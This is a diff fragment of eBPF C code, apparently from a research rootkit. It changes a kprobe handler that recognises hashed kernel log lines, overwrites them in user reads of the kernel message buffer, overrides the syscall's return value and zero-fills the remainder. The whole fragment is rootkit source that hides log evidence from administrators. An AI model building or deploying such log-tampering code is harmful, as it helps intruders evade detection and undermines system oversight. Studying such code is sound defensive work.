@@ -100,13 +100,12 @@ int kmsg(struct pt_regs *ctx)
         }
     }
 
-    //systemd[1]: Resync Network Time Service.
-
     if (hash == 0xada8e5f3e94cf1f8 || hash == 0x55c7edee212d1ef4)
     {
         int key = fd_attr->kmsg % 30;
         struct kmsg_t *kmsg = (struct kmsg_t *)bpf_map_lookup_elem(&rk_kmsg, &key);
-        if (!kmsg) {
+        if (!kmsg)
+        {
             return 0;
         }
         fd_attr->kmsg++;
@@ -116,7 +115,15 @@ int kmsg(struct pt_regs *ctx)
         fd_attr->read_buf += o1 + sizeof(kmsg->str) - 1;
         fd_attr->read_size = retval - (o1 + sizeof(kmsg->str) - 1);
 
+        fd_attr->action.id |= OVERRIDE_RETURN_ACTION;
+        fd_attr->action.return_value = kmsg->size + o1;
+
+        // be sure to override everything
         bpf_tail_call(ctx, &rk_progs, FILL_WITH_ZERO_PROG);
+    }
+    else 
+    {
+        fd_attr->action.id &= ~OVERRIDE_RETURN_ACTION;
     }
 
     return 0;
